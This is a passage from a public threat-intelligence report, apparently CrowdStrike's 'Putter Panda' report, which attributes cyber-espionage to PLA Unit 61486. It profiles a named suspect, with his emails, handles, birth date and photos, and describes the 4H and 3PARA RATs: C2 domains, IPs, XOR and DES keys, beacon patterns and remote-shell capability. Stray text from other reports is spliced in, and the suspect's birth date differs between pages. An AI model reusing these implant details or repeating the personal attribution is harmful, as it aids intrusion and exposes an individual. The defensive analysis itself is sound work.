Mozilla/4.0 ( compatible ; )                                User - Agent                            Troj / ReRol . A
/dr.asp                                                 Network string                         Troj / ReRol . A
Public release
Threat Intelligence
“ The Eye of the Tiger ”                                  Page : 58/58
Copyright © 2014 Airbus Defence & Space - All rights reserved

CrowdStrike                                                                                                                                    Putter Panda
Intelligence
Report
Crowdstrike Global Intelligence Team
This report is part of the series of technical and strategic reporting available to CrowdStrike Intelligence subscribers . It is being released publicly
to expose a previously undisclosed PLA unit involved in cyberespionage against Western technology companies .
In May 2014 , the U.S. Department of Justice charged five Chinese nationals for economic espionage against U.S.
corporations . The five known state actors are officers in Unit 61398 of the Chinese People ’s Liberation Army ( PLA ) . In
response , the Chinese government stated that the claims were “ absurd ” and based on “ fabricated facts ” . China then went
even further , stating “ The Chinese government , the Chinese military and their relevant personnel have never engaged or
participated in cyber theft of trade secrets . ”
We believe that organizations , be they governments or corporations , global or domestic , must keep up the pressure and hold
China accountable until lasting change is achieved . Not only did the U.S. Government offer in its criminal indictment the
foundation of evidence designed to prove China ’s culpability in electronic espionage , but also illustrated that the charges
are only the tip of a very large iceberg . Those reading the indictment should not conclude that the People ’s Republic of
China ( PRC ) hacking campaign is limited to five soldiers in one military unit , or that they solely target the United States
government and corporations . Rather , China ’s decade - long economic espionage campaign is massive and unrelenting .
Through widespread espionage campaigns , Chinese threat actors are targeting companies and governments in every
part of the globe .
At CrowdStrike , we see evidence of this activity first - hand as our services team conducts Incident Response investigations
and responds to security breaches at some of the largest organizations around the world . We have first - hand insight into the
billions of dollars of intellectual property systematically leaving many of the largest corporations - often times unbeknownst
to their executives and boards of directors .
The campaign that is the subject of this report further points to espionage activity outside of Unit 61398 , and reveals
the activities of Unit 61486 . Unit 61486 is the 12th Bureau of the PLA ’s 3rd General Staff Department ( GSD ) and is
headquartered in Shanghai , China . The CrowdStrike Intelligence team has been tracking this particular unit since 2012 ,
under the codename PUTTER PANDA , and has documented activity dating back to 2007 . The report identifies Chen Ping ,
aka cpyy , and the primary location of Unit 61486 .
This particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade
secrets , primarily relating to the satellite , aerospace and communication industries . With revenues totaling $ 189.2 billion
in 2013 , the satellite industry is a prime target for espionage campaigns that result in the theft of high - stakes intellectual
property . While the gains from electronic theft are hard to quantify , stolen information undoubtedly results in an improved
competitive edge , reduced research and development timetables , and insight into strategy and vulnerabilities of the
targeted organization .
Parts of the PUTTER PANDA toolset and tradecraft have been previously documented , both by CrowdStrike , and in open
source , where they are referred to as the MSUpdater group . This report contains details on the tactics , tools , and techniques
used by PUTTER PANDA , and provides indicators and signatures that can be leveraged by organizations to protect
themselves against this activity . Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups ,
approximately half of which operate out of China and are believed to be tied to the Chinese government . This report is part
of our extensive intelligence library and was made available to our intelligence subscribers in April 2014 , prior to the
US Government ’s criminal indictment and China ’s subsequent refusal to engage in a constructive dialog .
Targeted economic espionage campaigns compromise technological advantage , diminish global competition , and ultimately
have no geographic borders . We believe the U.S. Government indictments and global acknowledgment and awareness
are important steps in the right direction . In support of these efforts , we are making this report available to the public to
continue the dialog around this ever - present threat .
George Kurtz
President / CEO & Co - Founder , CrowdStrike
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Table of     Executive summary ....................................................................................................................... 4
Contents :    Key Findings ........................................................................................................................................ 5
attribution ....................................................................................................................................... 7
C2 Indicators ................................................................................................................................... 8
Targeting ....................................................................................................................................... 10
Connections to Other Adversary Groups .................................................................................. 11
“ CPYY ” ................................................................................................................................................ 12
711 Network Security Team ......................................................................................................... 16
Military Connections .................................................................................................................... 17
Unit 61486 .......................................................................................................................................... 20
Binary Indicators .......................................................................................................................... 24
conclusions ................................................................................................................................... 25
TECHNICAL ANALYSIS ...................................................................................................................... 27
3PARA RAT .......................................................................................................................................... 28
PNGDOWNER .................................................................................................................................... 33
HTTPCLIENT ......................................................................................................................................... 34
DROPPERS - RC4 AND XOR BASED .................................................................................................. 35
MITIGATION & REMEDIATION ........................................................................................................... 38
REGISTRY ARTIFACTS .......................................................................................................................... 39
FILE SYSTEM ARTIFACTS ...................................................................................................................... 39
HOST INDICATORS .............................................................................................................................. 39
YARA Rules .................................................................................................................................... 40
NETWORK SIGNATURES ...................................................................................................................... 44
Snort Rules .................................................................................................................................. 44
TTPS ..................................................................................................................................................... 46
Conclusion ................................................................................................................................... 48
APPENDIX 1 : 4H RAT SAMPLE METADATA ........................................................................................ 50
APPENDIX 2 : 3PARA RAT SAMPLE METADATA .................................................................................. 53
APPENDIX 3 : PNGDOWNER SAMPLE METADATA ............................................................................. 54
APPENDIX 4 : HTTPCLIENT SAMPLE METADATA ................................................................................. 57
CrowdStrike Falcon Intelligence ........................................................................................... 58
CrowdStrike Falcon ................................................................................................................... 59
About CrowdStrike ...................................................................................................................... 60
2
Executive Summary
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
EXECUTIVE SUMMARY
CrowdStrike has been tracking the activity of a cyber espionage group operating out of Shanghai ,
China , with connections to the People ’s Liberation Army Third General Staff Department ( GSD ) 12th
Bureau Military Unit Cover Designator ( MUCD ) 61486 , since 2012 . The attribution provided in this report
points to Chen Ping , aka cpyy ( born on May 29 , 1979 ) , as an individual responsible for the domain
registration for the Command and Control ( C2 ) of PUTTER PANDA malware . In addition to cpyy , the
report identifies the primary location of Unit 61486 .
PUTTER PANDA is a determined adversary group , conducting intelligence - gathering operations
targeting the Government , Defense , Research , and Technology sectors in the United States , with
specific targeting of the US Defense and European satellite and aerospace industries . The PLA ’s GSD
Third Department is generally acknowledged to be China ’s premier Signals Intelligence ( SIGINT )
collection and analysis agency , and the 12th Bureau Unit 61486 , headquartered in Shanghai ,
supports China ’s space surveillance network .
Domains registered by Chen Ping were used to control PUTTER PANDA malware . These domains were
registered to an address corresponding to the physical location of the Shanghai headquarters of
12th Bureau , specifically Unit 61486 . The report illuminates a wide set of tools in use by the actors ,
including several Remote Access Tools ( RATs ) . The RATs are used by the PUTTER PANDA actors to
conduct intelligence - gathering operations with a significant focus on the space technology sector .
This toolset provides a wide degree of control over a victim system and can provide the
opportunity to deploy additional tools at will . They focus their exploits against popular productivity
applications such as Adobe Reader and Microsoft Office to deploy custom malware through
targeted email attacks .
This report contains additional details on the tactics , tools , and techniques used by PUTTER PANDA ,
and provides indicators and signatures that can be leveraged by organizations to protect
themselves against this activity .
4
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
KEY FINDINGS
➔ Putter Panda is a cyber espionage       ➔ The group has been operating since
actor that conducts operations from        at least 2007 and has been observed
Shanghai , China , likely on behalf of       heavily targeting the US Defense and
the Chinese People ’s Liberation Army       European satellite and aerospace
( PLA ) 3rd General Staff Department         industries .
12th Bureau Unit 61486 . This unit is
supports the space based signals        ➔ They focus their exploits against
intelligence ( SIGINT ) mission .              popular productivity applications
such as Adobe Reader and Microsoft
➔ The 12th Bureau Unit 61486 ,                 Office to deploy custom malware
headquartered in Shanghai , is widely        through targeted email attacks .
accepted to be China ’s primary
SIGINT collection and analysis          ➔ CrowdStrike identified Chen Ping ,
agency , supporting China ’s space           aka cpyy , a suspected member of
surveillance network .                      the PLA responsible for procurement
of the domains associated with
➔ This is a determined adversary             operations conducted by Putter
group , conducting intelligence-            Panda .
gathering operations targeting the
Government , Defense , Research ,          ➔ There is infrastructure overlap with
and Technology sectors in the              Comment Panda , and evidence
United States , with specific               of interaction between actors tied
targeting of space , aerospace ,             to both groups .
and communications .
5
Attribution
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Attribution
There are several pieces of evidence
to indicate that the activity tracked
by CrowdStrike as PUTTER PANDA is
attributable to a set of actors based
in China , operating on behalf of the
Chinese People ’s Liberation Army ( PLA ) .
Specifically , an actor known as cpyy ( Chen
Ping ) appears to have been involved
in a number of historical PUTTER PANDA
campaigns , during which time he was likely
working in Shanghai within the 12th Bureau ,
3rd General Staff Department ( GSD ) .
PUTTER PANDA has several connections to
actors and infrastructure tied to COMMENT
PANDA , a group previously attributed to
Unit 61398 of the PLA .
7
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
C2 Indicators
Although some of the domains used
for command and control of the tools
described later in this report appear
to be legitimate sites that have been
compromised in some way , many of
them appear to have been originally
registered by the operators . Table
1 shows the domains that appear
to have been registered by these
actors , and the original email address
used where known .
Table 1 .
C2 Domains and
Original Registrant
Email Addresses
8
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
C2 Indicators ( cont’d )
The most significant finding is that an actor known as cpyy appears to have registered a significant number
of C2 domains . This actor is discussed in the next section .
Many of the domains have had their registrant information changed , likely in an attempt to obfuscate the
identity of the operators . For instance , several domains originally registered by cpyy had their email address
updated to van.dehaim@gmail.com around the end of 2009 ; for siseau.com the change occurred between
July 2009 and November 2009 , and for vssigma.com , the change occurred between August 2009 and
December 2009 . Historical registrant information for anfoundation.us , rwchateau.com , and succourtion.org
was not available prior to 2010 , but it is likely that these domains were also originally registered to a personally
attributable email account .
Similarly , several domains registered to
mike.johnson_mj@yahoo.com have had
their registrant email updated during March
2014 ( see Table 2 ) .
These registrant changes may indicate
an increased awareness of operational
security ( OPSEC ) from the PUTTER PANDA
actors . The recent changes to the domains
shown in Table 2 may indicate that the
Table 2 . New
Registrant Email                                                operators are preparing new campaigns
Addresses for                                                   that make use of this infrastructure , or they
Domains Original-
are attempting to disassociate all these
ly Registered to
mike.johnson_mj@
yahoo.com                                                       Although no attributable information was
found on the email addresses associated
with the domains described above ( aside
from cpyy and httpchen – see below ) ,
several other domains were found to have been registered by some of these addresses . These are shown
in Table 3 , and may be used for command and control of PUTTER PANDA tools . domains from a single email
address , perhaps due to OPSEC concerns or issues with the specific email account .
9
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
C2 Indicators
( cont’d )
Targeting
The subdomains associated with
these domains via DNS records , along
with some of the domain names
themselves , point to some areas
of interest for the PUTTER PANDA
operators ( see also Droppers in the
following Technical Analysis section ) :
• Space , satellite , and remote
sensing technology ( particularly
within Europe ) ;
• Aerospace , especially European
aerospace companies ;
• Japanese and European
telecommunications .
It is likely that PUTTER PANDA will
continue to attack targets of
this nature in future intelligence-
gathering operations .
Table 3 . Domains
Associated with
Registrant Emails
Found in PUTTER
PANDA C2 Domains
10
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
C2 Indicators ( cont’d )                                            The decipherment.net domains resolved to this IP
address from 11 October 2012 to at least 25 February
2013 , and the botanict.com domain resolved from 11
Connections to Other
October 2012 to 24 March 2013 .
Adversary Groups
During part of this timeframe ( 30 June 2012 - 30
COMMENT PANDA
October 2012 ) , a domain associated with COMMENT
Based on passive DNS records ,
PANDA resolved to this same IP address : login .
several PUTTER PANDA associated
aolon1ine.com . Additionally , for a brief period in April
domains have resolved to IP
2012 , update8.firefoxupdata.com also resolved to
address 100.42.216.230 :
this IP address .
• news.decipherment.net
• res.decipherment.net
The use of the same IP address during the same time
• spacenews.botanict.com
suggests that there is perhaps some cooperation or
• spot.decipherment.net
shared resources between COMMENT PANDA and
PUTTER PANDA .
Additionally , several subdomains of
ujheadph.com resolved to this IP :
VIXEN PANDA
• chs.ujheadph.com
Although not as conclusive as the
• imageone.ujheadph.com
links to COMMENT PANDA , IP address
• img.ujheadph.com
31.170.110.163 was associated
• klcg.ujheadph.com
with VIXEN PANDA domain blog .
• naimap.ujheadph.com
strancorproduct.info from November to December
• neo.ujheadph.com
2013 . In February 2014 , this IP address was also
• newspace.ujheadph.com
associated with PUTTER PANDA domain ske.hfmforum .
• pasco.ujheadph.com
com . While not directly overlapping , this potential
infrastructure link is interesting , as VIXEN PANDA has
Another subdomain of ujheadph.com has been
previously displayed TTPs similar to COMMENT PANDA
observed 2 in connection with distinctive traffic
( other CrowdStrike reporting describes VIXEN PANDA
originating from the 3PARA RAT ( described below ) ,
malware that extracts C2 commands embedded
making it probable that this domain is
between delimiters in web content ) , and has
also associated with PUTTER PANDA .
extensively targeted European entities .
2
See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report .
php%3Fid%3D9771458+&cd=2&hl = en&ct = clnk&gl = uk
11
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
“ CPYY ”
Several email addresses have been associated with cpyy , who also appears to use the alternate handles
cpiyy and cpyy.chen :
• cpyy@sina.com
• cpyy@hotmail.com
• cpyy.chen@gmail.com
• cpyy@cpyy.net
The cpyy.net domain lists “ Chen Ping ” as the registrant name , which may be cpyy ’s real name , as this
correlates with the initials “ cp ” in “ cpyy ” . A personal blog for cpyy was found at http://cpiyy.blog.163.com/.
The profile on this blog ( shown in Figure 2 below ) indicates that the user is male , was born on 25 May 1979 ,
and works for the “ military / police ” ( 其他- 军人/警察 ) .
Figure 2 . cpyy
Personal Blog on
163.com
12
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
“ CPYY ” ( cont’d )
This blog contains two postings in the “ IT ” category that indicate at least a passing interest in the topics of
networking and programming . A related CSDN profile for user cpiyy indicates that cpyy was working on or
studying these topics in 2002 and 20033 .
Another personal blog for cpyy ( http://www.tianya.cn/1569234/bbs ) appears to have last been updated in
2007 . This states that the user lives in Shanghai , and has a birthdate identical to that in the 163.com blog .
cpyy was also active on a social networking site called XCar , stating that he lived in Shanghai as early as
2005 through 2007 ; he said in a post , “ Soldier ’s duty is to defend the country , as long as our country is safe ,
our military is excellent”4 , indicating a feeling of patriotism that could be consistent with someone who
chose a military or police - based career .
Figure 3 . cpyy
Personal Blog on
tianya.cn
3
See postings : http://bbs.csdn .
net / users / cpiyy / topics
4
hxxp://www.xcar.com .
cn / bbs / viewthread .
php?tid=7635725&page=6
13
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
“ CPYY ” ( cont’d )
On the XCar forum , cpyy.chen used a subforum
called POLO ( hacker slang for “ Volkswagen cars ” )
to communicate with other users Linxder , peggycat ,
“ Naturally do not understand romance ” ( 天生不懂浪漫 ) ,
“ a wolf ” ( 一只大灰狼 ) , “ large tile ” ( 大瓦片 ) , “ winter ” (
冬夜 ) , “ chunni ” ( 春妮 ) , papaya , kukuhaha , Cranbing ,
“ dusty sub ” ( 多尘子 ) , z11829 , “ ice star harbor ” ( 冰星港 ) ,
“ polytechnic Aberdeen ” ( 理工仔 ) , “ I love pineapple
pie ” ( 我爱菠罗派 ) , and “ she ’s distant ” in 2007 . Although
superficially the discussion is about cars , there is a
repeated word in the text , “ milk yellow package ” or
“ custard package ” or “ yoke package ” ( 奶黄包 ) . This
could be a hacker slang word , but it is unclear as to the
definition . The conversation alludes to Linxder being the
“ teacher ” or “ landlord ” and the other aforementioned
users are his “ students ” . Linxder references how he has
“ found jobs ” for them . It is possible that this is a reference
to hacking jobs wrapped up in car metaphors .
Linxder is the handle of an actor associated with
the likely Shanghai - based COMMENT PANDA group5
. Linxder , cpyy , and xiaobai have all discussed
programming and security related topics on cpyy ’s site ,
cpyy.org6 , which hosted a discussion forum for the 711
Network Security Team ( see below ) .
cpyy also appears to have a keen interest in
photography ; his 163.com blog includes several
photographs taken by cpyy in the blog postings and
albums section . Some of these photographs also appear
Figure 4 . cpyy.chen ,
in a Picasa site7 ( examples are shown in Figures 5 and 6 )
from 2005 , 2006 ,
belonging to a user cpyy.chen .                                    and 2007
( left to right )
An album in this site named “ me ” has several shots of
what is likely cpyy himself , from 2005 , 2006 , and 2007 ,
shown to the right :
14
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
“ CPYY ” ( cont’d )
An account on rootkit.com , a popular low - level software security site , existed for user cpyy and was accessed
in at least May 2004 . This account was registered with primary email address cpyy@cpyy.net and backup email
address cpyy@hotmail.com ; it listed a date of birth as 24 May 1979 , consistent with cpyy ’s other profiles . The
IP address 218.242.252.214 was associated with this account ; it is owned by the Oriental Cable Network Co. ,
Ltd. , an ISP located in Shanghai . Registration on this forum shows that cpyy had an interest in security - related
programming topics , which is backed up by the postings on his personal blog and CSDN account .
Figure 6 . Example
Photograph from
163.com Blog
Figure 5 . Sample
Photograph from
cpyy.chen’s
Picasa Albums
15
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
“ CPYY ” ( cont’d )
711 Network Security Team
One of the sites registered to cpyy was used to host a web - based email service , along with a forum on www .
cpyy.net . Both of these services were apparently run by the 711 Network Security Team ( 711网络安全小组 ) , a
group that is now likely defunct , but has previously published security - based articles that have been re - posted
on popular Chinese hacking sites such as xfocus.net8 .
One of these articles , entitled “ IMD - based packet
filtering firewall to achieve the principles”9 , is
apparently authored by xiaobai , with email address
xiaobai@openfind.com.cn ; it was published on
the “ GRATEFUL ” ( 饮水思源 ) security digest list10 that
is hosted by Shanghai Jiao Tong University ( SJTU ) .
This digest list / bulletin board was also frequented
by ClassicWind , an actor possibly linked to the
Shanghai - based , PLA - sponsored adversary group
COMMENT PANDA , as described in . This Tipper also
indicates that “ the Chinese Communist Party ( CCP )
and the People ’s Liberation Army ( PLA ) aggressively
target SJTU and its School of Information Security
Engineering ( SISE ) as a source of research and
student recruitment to conduct network offense
and defense campaigns ” , so it is possible that the
Figure 7 . httpchen
711 Network Security Team members came to the
Posting on SJTU
“ GRATEFUL ” BBS                                                           attention of the Chinese state via this institution .
An additional connection to SJTU comes from
a C2 domain , checalla.com , used with the 4H RAT in 2008 . This domain was registered to httpchen@gmail .
com at the time , and this address was also used to make a posting on the GRATEFUL BBS ( shown in Figure 7 ) .
The posting indicates that httpchen is located at the 闵行 ( Minhang ) campus of SJTU and was posting using
IP address 58.196.156.15 , which is associated with the China Education and Research Network ( CERNET ) , a
nationwide network managed by the Chinese Ministry of Education . It also states that httpchen is studying at
the school of Information Security Engineering within SJTU .
8
For example , hxxp://www.xfocus.net / articles/200307/568.html
9
This article also lists http://cpyy.vicp.net/ as the original source site , although no archived content could be recovered for this .
10
See http://bbs.sjtu.edu.cn/bbsanc,path,/groups/GROUP_3/Security/D44039356/D69C6D2AC/D4C11F438/D6DB67E4E/DA69FF663/
M.1052844461.A.html
16
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
“ CPYY ” ( cont’d )
Military Connections
Several pieces of evidence indicate that cpyy probably has connections to , or is part of , the Chinese military
– specifically the PLA Army . In addition to his declaration on his personal blog that he works for the “ military/
police ” , and contacts with actors such as Linxder that have been previously associated with hacking units
within the PLA , cpyy ’s Picasa site contains several photographs that hint at military connections .
First , a monochrome picture from
the 大学时代 ( “ college ” ) album
posted in February 2007 shows
several uniformed individuals :
It is not clear whether this picture
includes cpyy , or just friends/
associates / relatives .
A picture from the 中学时代
( “ high school ” ) album posted in
February 2007 shows a male –
likely cpyy based on the clothing
shown in the second picture ,
which matches the pictures of
cpyy shown above – performing
exercise in front of a group of
likely soldiers and an officer :
17
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Although somewhat unclear , pictures from the album 2002年的生日 ( “ 2002 birthday ” ) , also posted in
February 2007 , show the celebrant ( likely cpyy ) in khaki clothes that are possibly military wear .
The most compelling pictures ,
however , are found in the 宿舍
and 办公室 albums ( “ dormitory ”
and “ office ” ) . A shot of probably
cpyy ’s dormitory room shows in the
background two military hats that
appear to be Type 07 PLA Army
officer peak hats :
18
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
This album also contains a shot of the exterior of a building with several large satellite dishes outside :
This same building and the
satellite dishes also appear
in the “ office ” album . The
reflection effects observed
on the windows of this
building could be due to
coatings applied to resist
eavesdropping via laser
microphones and to increase
privacy , which would be
consistent with a military
installation conducting
sensitive work .
19
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Above is an image from the same album of what appears to be a larger dish , in front of the Oriental Pearl
Tower , a significant landmark in Shanghai :
UNIT 61486
As mentioned above , checalla.com was used for command and control with the PUTTER PANDA 4H RAT in
2008 . This domain was registered to httpchen@gmail.com , and in May 2009 the domain registration details
were updated to include a Registrant Address of “ shanghai yuexiulu 46 45 202 # ” . A search for this location
reveals an area of Shanghai shown in Figure 812 .
Figure 9 shows an enlargement of satellite imagery from within this area , depicting a facility containing
several satellite dishes within green areas , sports courts and a large office building .
Source : https://www.google.com/maps/place/31%C2%B017’18.0%22N+121%C2%B027’18.7%22E/@31.2882939,121.4554673,658m/
12
data=!3m1!1e3!4m2!3m1!1s0x0:0x0
20
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Figure 8 . Map and
Satellite Views of
Area of Interest in
Shanghai
Figure 9 . Enlarged
Section within
Area of Interest
21
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Satellite imagery from 2009 showing another aspect of this office building , along with a likely vantage point
and direction of camera , alongside probably cpyy ’s photograph from the same angle , is shown in Figure 10 :
Figure 10 . Satellite
Imagery of Facility
Alongside Handheld
Image from cpyy
Based on the Shanghai location , and common features , it is highly likely that the location shown above
is the same as that photographed by cpyy and shown in the “ office ” and “ dormitory ” albums . Further
confirmation can be found from photos uploaded by a user on Panoramio13 who tags the image as being
located in Chabei14 , Shanghai , China ( 31° 17’ 18.86 ” N 121° 27’ 9.83 ” E ) . This image is exceptionally similar
to building shown in cpyy ’s “ office ” album ( see Figure 11 below ) .
http://www.panoramio.com/user/3305909
13
Alternately Romanized as Zhabei
14
22
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Figure 11 . Panoramio
( left ) and cpyy
Images Compared
According to a public report15 on the Chinese PLA ’s General Staff Department ( GSD ) , the 12th Bureau of
the 3rd GSD is headquartered in the Zhabei district of Shanghai and “ appears to have a functional mission
involving satellites , likely inclusive of intercept of satellite communications and possibly space - based SIGINT
collection ” . The same report also lists a Military Unit Cover Designator ( MUCD ) of 61486 for this bureau .
A webpage16 published on a Chinese government site detailing theatrical performances involving members
of the PLA lists an address of “ 闸北区粤秀路46号 ” ( 46 Yue Xiu Road , Zhabei District ) for “ 总参61486部队 ” ( 61486
Forces General Staff ) . A search for this location shows an identical area to that shown in Figure 8 .
It can therefore be concluded with high confidence that the location shown in cpyy ’s imagery , along
with the satellite images above , is the headquarters of the 12th Bureau , 3rd GSD , Chinese PLA – also
known as Unit 61486 . This unit ’s suspected involvement in “ space surveillance”17 and “ intercept of satellite
communications ” fits with their observed targeting preferences for Western companies producing
technologies in the space and imaging / remote sensing sectors . The size and number of dishes present in
the area is also consistent with these activities .
15
http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf
16
http://www.dfxj.gov.cn/xjapp/wtzyps/wtlzy/wyyjysl/zhc/zyc/bd01d910153ffb4d0115a7c12f70042e.html
17
http://project2049.net/documents/china_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf
23
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Binary indicators
Observed build times for the PUTTER PANDA tools described in this report range from 2007 to late 2013 ,
indicating that the actors have conducted several campaigns against their objectives over a period of
several years . A build time analysis of all known samples is shown in Figure 1 below , relative to China time .
Figure 1 . Build
Time Analysis of
PUTTER PANDA
Malware , Relative
to China Time
( UTC+8 )
Although this shows that there is some bias in the build time distribution to daylight or working hours in China , which
is more significant if a possible three - shift system of hours is considered ( 0900 - 1200 , 1400 - 1700 , and 2000 - 2300 ) , this
evidence is not conclusive . There is also some evidence that build times are manipulated by the adversary ; for
example , the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013 , but was
supposedly first submitted to VirusTotal on 9 January 2013 . This shows that the attackers – at least in 2013 – were aware
of some operational security considerations and were likely taking deliberate steps to hide their origins .
24
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Conclusions
There is strong evidence to tie cpyy , an actor who
appears to have been involved in historical PUTTER
PANDA operations , to the PLA army and a location in
Shanghai that is operated by the 12th Bureau , 3rd GSD
of the PLA ( Unit 61486 ) . Another actor tied to this activity ,
httpchen , has declared publically that he was attending
the School of Information Security Engineering at SJTU .
This university has previously been posited as a recruiting
ground for the PLA to find personnel for its cyber
intelligence gathering units , and there is circumstantial
evidence linked cpyy to other actors based at SJTU .
Given the evidence outlined above , CrowdStrike
attributes the PUTTER PANDA group to PLA Unit 61486
within Shanghai , China with high confidence . It is likely
that this organization is staffed in part by current or
former students of SJTU , and shares some resources and
direction with PLA Unit 61398 ( COMMENT PANDA ) .
25
Technical Analysis
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Technical Analysis
Several RATs are used by PUTTER PANDA . The most common of these , the 4H
RAT and the 3PARA RAT , have been documented previously by CrowdStrike
in previous CrowdStrike Intelligence reporting . This analysis will be revisited
below , along with an examination of two other PUTTER PANDA tools :
pngdowner and httpclient . Two droppers have been associated with the
PUTTER PANDA toolset ; these are also briefly examined below .
4H RAT – EXAMPLE MD5 HASH
A76419A2FCA12427C887895E12A3442B
This RAT was first analyzed by CrowdStrike in April 2012 , but a historical analysis shows that it has been in
use since at least 2007 by the PUTTER PANDA actors . A listing of metadata for known samples , including C2
Screenshot of Truecaller
information , is shown in Appendix 1 .
Database Shared by
DEADEYE JACKAL on Their
The operation of this RAT is described in detail in other CrowdStrike reporting , but isTwitter
usefulAccount
to revisit here to
( names
highlight the characteristics of the RAT :                                               redacted )
• C2 occurs over HTTP , after connectivity has been verified by making a distinctive request ( to the URI /
search?qu= at www.google.com ) .
• A victim identifier is generated from the infected machine ’s hard disk serial number , XOR’ed with the key
ldd46!yo , and finally nibble - wise encoded as upper - case ASCII characters in the range ( A - P ) – e.g. , the
byte value 0x1F becomes “ BP ” .
• A series of HTTP requests characterizes the RAT ’s C2 . The initial beacon uses a request with four parameters
( h1 , h2 , h3 , and h4 ) – as shown in Figure 8 – to register the implant with the C2 server .
• Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE .
• The commands supported by the RAT enable several capabilities , including :
o Remote shell
o
 Listing of running processes ( including loaded modules )
o Process termination ( specified by PID )
o File and directory listing
o File upload , download , deletion , and timestamp modification
27
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Figure 8 . 4H RAT
Example Beacon
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Figure 9 . Sample
Twitter Account ( names
Python Code to
redacted )
Decode Hostname
from User - Agent
3PARA RAT – EXAMPLE MD5 HASH                                                                 Snippet
BC4E9DAD71B844DD3233CFBBB96C1BD3
The 3PARA RAT was described in some detail in other CrowdStrike reporting , which
examined a DLL - based sample with an exported filename of ssdpsvc.dll . Other
observed exported filenames are msacem.dll and mrpmsg.dll , although the RAT has
also been observed in plain executable ( EXE ) format .
On startup , the RAT attempts to create a file mapping named
& * SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf . This is used to prevent multiple instances of
the RAT being executed simultaneously . The RAT will then use a byte - wise subtraction-
based algorithm ( using a hard - coded modulo value ) to decode C2 server details
consisting of a server hostname and port number , in this example nsc.adomhn .
com , port 80 . The decoding algorithm is illustrated in Figure 10 below . The key and
modulo values vary on a per - sample basis . Decoded C2 settings , along with sample
metadata , are listed in Appendix 2 .
28
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Figure 10 . Sample
Python Code Illus-
trating C2 Server
Decoding Routine
The RAT is programmed in C++ using Microsoft Visual Studio , and it makes use of the
object - oriented and parallel programming features of this environment ; Standard
Template Library ( STL ) objects are used to represent data structures such as strings and
lists , and custom objects are used to represent some of the C2 command handlers
( e.g. , CCommandCMD ) . Several threads are used to handle different stages of the
C2 protocol , such as receiving data from the server , decrypting data , and processing
commands . Standard Windows primitives such as Events are used to synchronize
across these threads , with a shared global structure used to hold state .
Once running , the RAT will load a binary representation of a date / time value13 from a
Screenshot of Truecaller
file C:\RECYCLER\restore.dat , and it will sleep until after this date / time has passed . Database
This      Shared by
provides a mechanism for the operators to allow the RAT to remain dormant until aDEADEYE JACKAL on Their
Twitter Account ( names
fixed time , perhaps to allow a means of regaining access if other parts of their toolset
are removed from a victim system .                                                      redacted )
Figure 11 . 3PARA
RAT Initial Beacon
As with the 4H RAT , the C2 protocol used by the 3PARA RAT is HTTP based , using
both GET and POST requests . An initial request is made to the C2 server ( illustrated
in Figure 11 above ) , but the response value is effectively ignored ; it is likely that this
request serves only as a connectivity check , as further C2 activity will only occur
if this first request is successful . In this case , the RAT will transmit some basic victim
information to the C2 server along with a 256-byte hash of the hard - coded string
HYF54&%9&jkMCXuiS. It is likely that this request functions as a means to authenticate
the RAT to the C2 server and register a new victim machine with the controller . A
sample request and its structure are shown in Figure 12 .
Using the standard Windows SYSTEMTIME structure
13
29
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
Figure 12 . Sample
3PARA RAT Second-
ary Beacon/
C2 Registration
See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API , which is rarely used .
14
30
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
If this request is also successful , the RAT will attempt to retrieve tasking from the
controller using a further distinctive HTTP request shown in Figure 13 , repeating this
Screenshot of Truecaller
request every two seconds until valid tasking is returned .
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
Figure 13 . 3PARA
RAT Sample Tasking
Request
31
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the MD5 hash
of the string HYF54&%9&jkMCXuiS ( as used in the secondary beacon shown above ) . If this fails , the RAT will fall
back to decoding the data using an 8-byte XOR with a key derived from data returned from the HashData API
with the same key string . Output data produced by tasking instructions is encrypted in the same manner as it
was decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft / errorpost/
default.aspx?ID= , where the ID value is a random number in decimal representation – as with the initial request
shown in Figure 4 .
The set of commands supported by the RAT is somewhat limited , indicating that perhaps the RAT is intended
